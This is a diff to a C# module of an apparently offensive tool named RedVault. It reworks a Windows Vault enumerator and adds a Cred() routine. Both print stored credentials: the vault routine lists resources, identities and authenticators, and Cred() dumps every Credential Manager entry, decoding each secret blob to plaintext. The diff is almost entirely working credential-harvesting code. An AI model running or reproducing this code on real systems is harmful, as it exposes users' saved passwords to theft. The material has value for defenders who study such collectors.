@@ -1,8 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Text;
 using static System.Runtime.InteropServices.JavaScript.JSType;
+using static RedVault.Modules.m_vault;
+using static RedVault.Modules.m_cred;
+using static RedVault.Modules.m_globals;
 
 namespace RedVault.Collectors.Vault
 {
@@ -11,7 +15,7 @@ namespace RedVault.Collectors.Vault
         public static (VAULT_ELEMENT_TYPE type, object value) GetVaultItemData(IntPtr itemptr)
         {
             var item = Marshal.PtrToStructure<VAULT_ITEM_DATA>(itemptr);
-
+            
             object value;
 
             IntPtr dataptr = (IntPtr)(itemptr.ToInt64() + 16);
@@ -67,10 +71,10 @@ namespace RedVault.Collectors.Vault
 
         }
 
-        public static void Run()
+        public static void List()
         {
-
-            var result = VaultApi.VaultEnumerateVaults(0, out uint cbItems, out IntPtr vaults);
+  
+            var result = VaultEnumerateVaults(0, out uint cbItems, out IntPtr vaults);
 
             if (result != 0)
             {
@@ -84,9 +88,9 @@ namespace RedVault.Collectors.Vault
 
                 Guid guid = Marshal.PtrToStructure<Guid>(vaultPtr);
 
-                Console.WriteLine($"Vault: {guid.ToString()}\n");
+                Console.WriteLine($"[+] Vault: [{guid.ToString()}]\n");
 
-                result = VaultApi.VaultOpenVault(guid, 0, out IntPtr hVault);
+                result = VaultOpenVault(guid, 0, out IntPtr hVault);
 
                 if (result != 0)
                 {
@@ -94,7 +98,7 @@ namespace RedVault.Collectors.Vault
                     return;
                 }
 
-                result = VaultApi.VaultEnumerateItems(hVault, 512, out uint cbvItems, out IntPtr vItems);
+                result = VaultEnumerateItems(hVault, 512, out uint cbvItems, out IntPtr vItems);
 
                 if (result != 0)
                 {
@@ -114,7 +118,7 @@ namespace RedVault.Collectors.Vault
                         VAULT_ITEM_7 items7 = Marshal.PtrToStructure<VAULT_ITEM_7>(current);
 
                         var vaultpassitem = IntPtr.Zero;
-                        result = VaultApi.VaultGetItem_WIN7(hVault, ref items7.SchemaId, items7.Resource, items7.Identity, IntPtr.Zero, 0, ref vaultpassitem);
+                        result = VaultGetItem_WIN7(hVault, ref items7.SchemaId, items7.Resource, items7.Identity, IntPtr.Zero, 0, ref vaultpassitem);
 
                         if (result != 0)
                         {
@@ -134,7 +138,7 @@ namespace RedVault.Collectors.Vault
                         Console.WriteLine($"Identity: {iden.ToString()}");
                         Console.WriteLine($"Authenticator: {auth.ToString()}");
 
-                        VaultApi.VaultFree(vaultpassitem);
+                        VaultFree(vaultpassitem);
                     }
                     else
                     {
@@ -143,7 +147,7 @@ namespace RedVault.Collectors.Vault
                         VAULT_ITEM_8 items8 = Marshal.PtrToStructure<VAULT_ITEM_8>(current);
 
                         var vaultpassitem = IntPtr.Zero;
-                        result = VaultApi.VaultGetItem_WIN8(hVault, ref items8.SchemaId, items8.Resource, items8.Identity, items8.PackageSid, IntPtr.Zero, 0, ref vaultpassitem);
+                        result = VaultGetItem_WIN8(hVault, ref items8.SchemaId, items8.Resource, items8.Identity, items8.PackageSid, IntPtr.Zero, 0, ref vaultpassitem);
 
                         if (result != 0)
                         {
@@ -162,25 +166,77 @@ namespace RedVault.Collectors.Vault
                         Console.WriteLine($"Resource: {resource.ToString()}");
                         Console.WriteLine($"Identity: {iden.ToString()}");
                         Console.WriteLine($"Authenticator: {auth.ToString()}\n");
-                        
-                        VaultApi.VaultFree(vaultpassitem);
+
+                        VaultFree(vaultpassitem);
                     }
-
-                    
-
 
                 }
 
-                VaultApi.VaultFree(vItems);
+                VaultFree(vItems);
 
-                VaultApi.VaultCloseVault(ref hVault);
+                VaultCloseVault(ref hVault);
+            }
+
+        }
+
+        public static void Cred()
+        {
+            Console.WriteLine("[vault::cred]");
+            Console.WriteLine();
+
+            var result = CredEnumerate(null, 0, out uint count, out IntPtr credentials);
+
+            if (result)
+            {
+                
+                for (var i = 0; i < count; i++)
+                {
+                    IntPtr credPtr = Marshal.ReadIntPtr(credentials, i * Marshal.SizeOf<IntPtr>());
+
+                    CREDENTIAL cred = Marshal.PtrToStructure<CREDENTIAL>(credPtr);
+
+                    string plaintext = null;
+
+                    if (cred.CredentialBlob != IntPtr.Zero)
+                    {
+                        var credbytes = new byte[cred.CredentialBlobSize];
+                        Marshal.Copy(cred.CredentialBlob, credbytes, 0, cred.CredentialBlobSize);
+                        var flag = IsTextUnicodeFlags.IS_TEXT_UNICODE_STATISTICS;
+
+                        
+                        if(IsTextUnicode(credbytes,credbytes.Length, ref flag))
+                        {
+                            plaintext = Encoding.Unicode.GetString(credbytes);
+                        }
+                        else
+                        {
+                            plaintext = BitConverter.ToString(credbytes).Replace("-", " ");
+                        }
+                    }
+
+                    Console.WriteLine($"TargetName : {cred.TargetName}");
+                    Console.WriteLine($"UserName   : {cred.UserName}");
+                    Console.WriteLine($"Comment    : {cred.Comment}");
+                    Console.WriteLine($"Type       : {cred.Type}");
+                    Console.WriteLine($"Persist    : {cred.Persist}");
+                    Console.WriteLine($"Flags      : {cred.Flags}");
+                    Console.WriteLine($"Credential : {plaintext}");
+                    Console.WriteLine();
+
+                }
+
             }
 
 
 
 
 
+
         }
+
+
+
+
 
 
 
